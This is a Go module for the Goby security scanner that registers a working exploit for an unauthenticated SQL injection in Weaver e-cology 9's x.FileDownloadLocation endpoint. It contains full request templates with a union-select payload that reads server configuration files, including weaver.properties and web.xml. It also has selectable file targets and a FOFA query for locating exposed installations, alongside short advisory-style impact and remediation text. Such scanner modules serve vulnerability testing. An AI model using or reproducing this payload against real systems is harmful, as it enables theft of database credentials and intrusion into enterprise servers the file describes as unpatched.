package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology 9 /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation SQL Injection Vulnerability",
    "Description": "<p>Weaver e-cology is an enterprise-level collaborative management platform that includes enterprise information portals, knowledge document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management, and data center functions. The x.FileDownloadLocation interface of Weaver e-cology contains an SQL injection vulnerability. Unauthenticated remote attackers can exploit this vulnerability to obtain sensitive information from the database (such as admin backend passwords and user personal information) and, in high-privilege scenarios, write malicious code to the server to further gain system privileges.</p>",
    "Product": "Weaver-OA(E-COLOGY)",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-12-18",
    "PostTime": "2024-12-18",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\")) || body=\"doCheckPopupBlocked\")",
    "GobyQuery": "(((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\")) || body=\"doCheckPopupBlocked\")",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the SQL injection vulnerability to obtain sensitive information from the database (such as admin backend passwords and user personal information) and, in high-privilege scenarios, write malicious code to the server to further gain system privileges, leading to data breaches and security risks.</p>",
    "Recommendation": "<p>1. The vendor has not yet provided a patch for this vulnerability. Please monitor the vendor's website for updates: <a href=\"https://www.weaver.com.cn/.2.\">https://www.weaver.com.cn/.</a></p><p>2. Deploy a Web Application Firewall (WAF) to monitor database operations.</p><p>3. Disable public access to the system unless absolutely necessary.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/YCU1wbgeOqPrJ_CfntsbPg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "../ecology/WEB-INF/prop/weaver.properties,../ecology/WEB-INF/prop/mobilemode.properties,../ecology/WEB-INF/web.xml",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "../ecology/WEB-INF/prop/weaver.properties",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+all+select+'111','../ecology/WEB-INF/prop/mobilemode.properties','333','444','555','666'--&mailid=action.WorkflowFnaEffectNew&parentid=0",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+all+select+'111','{{{payload}}}','333','444','555','666'--&mailid=action.WorkflowFnaEffectNew&parentid=0",
                "follow_redirect": false,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "DriverClasses",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|variable|{{{lastbody}}}",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "泛微e-cology 9 /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation SQL 注入漏洞",
            "Product": "泛微-OA（e-cology）",
            "Description": "<p>泛微协同管理应用平台e-cology是一款企业级协同管理平台，涵盖企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理及数据中心功能。泛微协同管理应用平台e-cology的x.FileDownloadLocation接口存在SQL注入漏洞，未经身份验证的远程攻击者可以通过该漏洞获取数据库中的敏感信息（如管理员后台密码、用户个人信息），甚至在高权限情况下向服务器写入恶意代码，进一步获取系统权限。</p>",
            "Recommendation": "<p>1. 厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a>。</p><p>2. 部署Web应用防火墙（WAF），对数据库操作进行监控。</p><p>3. 如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用SQL注入漏洞获取数据库中的敏感信息（如管理员后台密码、用户个人信息），甚至在高权限情况下向服务器写入恶意代码，进一步获取系统权限，导致系统数据泄露及安全风险。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology 9 /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation SQL Injection Vulnerability",
            "Product": "Weaver-OA(E-COLOGY)",
            "Description": "<p>Weaver e-cology is an enterprise-level collaborative management platform that includes enterprise information portals, knowledge document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management, and data center functions. The x.FileDownloadLocation interface of Weaver e-cology contains an SQL injection vulnerability. Unauthenticated remote attackers can exploit this vulnerability to obtain sensitive information from the database (such as admin backend passwords and user personal information) and, in high-privilege scenarios, write malicious code to the server to further gain system privileges.</p>",
            "Recommendation": "<p>1. The vendor has not yet provided a patch for this vulnerability. Please monitor the vendor's website for updates: <a href=\"https://www.weaver.com.cn/.2.\">https://www.weaver.com.cn/.</a></p><p>2.&nbsp;Deploy a Web Application Firewall (WAF) to monitor database operations.</p><p>3. Disable public access to the system unless absolutely necessary.</p>",
            "Impact": "<p>Attackers can exploit the SQL injection vulnerability to obtain sensitive information from the database (such as admin backend passwords and user personal information) and, in high-privilege scenarios, write malicious code to the server to further gain system privileges, leading to data breaches and security risks.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation"
    },
    "VariablesOrder": [
        "payload",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
